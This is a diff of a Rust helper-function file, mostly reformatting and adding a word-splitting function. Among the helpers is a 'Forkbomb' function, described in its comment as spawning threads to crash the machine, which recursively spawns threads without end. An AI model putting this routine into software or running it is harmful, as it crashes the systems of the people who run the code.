@@ -1,27 +1,29 @@
 mod linux;
-use std::{path::Path, fs};
 use rand::Rng;
-
+use std::{fs, path::Path};
 
 // Revert returns a reversed string.
 fn Revert(s: String) -> String {
-	let reverted_string = s.chars().rev().collect::<String>();	
-	 reverted_string 
-	}
+    let reverted_string = s.chars().rev().collect::<String>();
+    reverted_string
+}
 
-fn FileToSlice(file: String) {
-	
-	}
+fn FileToSlice(file: String) {}
 
 // StrToInt converts a string into an integer.
 fn StrToInt(string_integer: String) -> u32 {
-	 string_integer.parse::<u32>().unwrap()
-	}
+    string_integer.parse::<u32>().unwrap()
+}
+
+// StrToWords returns a list of strings which was split by spaces.
+fn StrToWords(s: &str) -> Vec<&str> {
+    s.split(' ').collect()
+}
 
 // IntToStr converts an integer into a string.
 fn IntToStr(i: u32) -> String {
-	 i.to_string()
-	}
+    i.to_string()
+}
 
 // SizeToBytes converts a human friendly string indicating size into a proper integer.
 fn SizeToBytes(size: &str) -> u128 {
@@ -54,74 +56,72 @@ fn IntervalToSeconds(interval: &str) -> u128 {
 
 // RandomInt returns an integer within a given range.
 fn RandomInt(min: u32, max: u32) -> u32 {
-	 rand::thread_rng().gen_range(min..max)
-	}
+    rand::thread_rng().gen_range(min..max)
+}
 
 // RandomSelectStr returns a string that was randomly selected from a list of elements of vector.
 fn RandomSelectStr(list: Vec<String>) -> String {
-	let mut rng = rand::thread_rng();
-        let n = rng.gen_range(0..list.len());
-        list[n].clone()
-	}
+    let mut rng = rand::thread_rng();
+    let n = rng.gen_range(0..list.len());
+    list[n].clone()
+}
 
 // RandomSelectInt returns an integer that was randomly selected from a list of vector of integers.
 fn RandomSelectInt(list: Vec<u32>) -> u32 {
-	let mut rng = rand::thread_rng();
-        let n = rng.gen_range(0..list.len());
-        list[n]
-	}
+    let mut rng = rand::thread_rng();
+    let n = rng.gen_range(0..list.len());
+    list[n]
+}
 
 // RemoveNewLines removes possible newlines from a string.
 fn RemoveNewlines(s: String) -> String {
-         s.replace("\n", " ")
-         }
+    s.replace("\n", " ")
+}
 
 // FullRemove removes all instances of a string from another string.
 fn FullRemove(str: String, to_remove: String) -> String {
-         str.replace(&to_remove, "" )
-	}
+    str.replace(&to_remove, "")
+}
 
 // ContainsAny checks if a string exists within a vector of strings.
 fn ContainsAny(str: String, elements: Vec<String>) -> bool {
-	elements.contains(&str)
-	}
+    elements.contains(&str)
+}
 
-// RandomString randomly generates an alphabetic string of a given length.	
+// RandomString randomly generates an alphabetic string of a given length.
 fn RandomString(n: usize) -> String {
-	const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
-    	let  PASSWORD_LEN: usize = n;
-    	let mut rng = rand::thread_rng();
+    const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+    let PASSWORD_LEN: usize = n;
+    let mut rng = rand::thread_rng();
 
-    	 (0..PASSWORD_LEN)
-        		.map(|_| {
-            	let idx = rng.gen_range(0..CHARSET.len());
-            	CHARSET[idx] as char
-        		})
+    (0..PASSWORD_LEN)
+        .map(|_| {
+            let idx = rng.gen_range(0..CHARSET.len());
+            CHARSET[idx] as char
+        })
         .collect()
-	}
+}
 
 // ReadFile is used to read a given file and return its data as a string.
-fn ReadFile(filename: String) -> Result<String, std::io::Error>  {
-         fs::read_to_string(filename) 
-        }
+fn ReadFile(filename: String) -> Result<String, std::io::Error> {
+    fs::read_to_string(filename)
+}
 
 // WriteFile is used to write data into a given file.
 fn WriteFile(filename: &str, data: &str) -> Result<(), std::io::Error> {
-        fs::write(filename, data)
-        }
+    fs::write(filename, data)
+}
 
 // Forkbomb spawns threads in order to crash the machine.
 fn Forkbomb() {
-	loop {
-		std::thread::spawn(Forkbomb);
-	     }
-	}
+    loop {
+        std::thread::spawn(Forkbomb);
+    }
+}
 
 // Exists checks if a given file is in the system.
 fn Exists(file: String) -> bool {
-         Path::new(&file).exists()
-        }
-
-fn main() {
-    
+    Path::new(&file).exists()
 }
+
+fn main() {}
